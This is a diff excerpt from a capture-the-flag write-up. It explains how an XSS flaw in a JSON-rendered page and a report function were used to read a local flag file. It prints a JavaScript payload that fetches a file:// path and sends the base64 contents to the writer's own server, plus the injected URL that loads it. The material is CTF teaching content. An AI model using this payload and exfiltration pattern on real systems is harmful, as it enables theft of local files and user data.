@@ -71,20 +71,21 @@ file:///app/templates/flag.txt
 
 Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here:
 
-- Craft our payload script to fetch the flag.txt from ```file://```. Here's mine called (xss.js):
+Craft our payload script to fetch the flag.txt from ```file://```. Here's mine called (xss.js):
+
 ```javascript
 url='http://yourServer.com/6060?'
 fetch('file:///app/templates/flag.txt').then(resp=>resp.text()).then(flag=>fetch(url+(btoa(flag) || 'Nothing')));
 ```
 
 
-- Report this url with our payload in it:
+Report this url with our payload in it:
 
 ```
 file:///app/templates/index.html?", "status": "ok", "content":["\u0022><script src=http://yourServer.com:6060/xss.js></script>"],"ignore":"
 ```
 
-- Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)
+Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)
 
 ```flag:p4{can_i_haz_a_piece_of_flag_pliz?}```
 
